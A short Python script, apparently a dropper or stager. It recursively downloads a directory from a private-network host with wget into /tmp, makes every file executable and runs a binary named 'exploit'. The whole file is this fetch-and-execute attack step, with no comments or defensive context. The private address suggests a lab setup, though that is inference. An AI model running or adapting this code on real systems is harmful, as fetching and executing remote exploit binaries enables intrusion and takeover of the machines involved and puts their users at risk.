import os
from subprocess import Popen

url2 = 'http://192.168.122.48/life/'
args2 = ['wget', '-q', '-r', "--no-parent", "--no-host", url2, '-P', "/tmp/"]
output2 = Popen(args2)
output2.wait()
location = '/tmp/life'
mod = Popen(['chmod', "-R", '+x', location])
mod.wait()
os.chdir( location )
o = Popen([location+'/exploit'])
o.wait()    

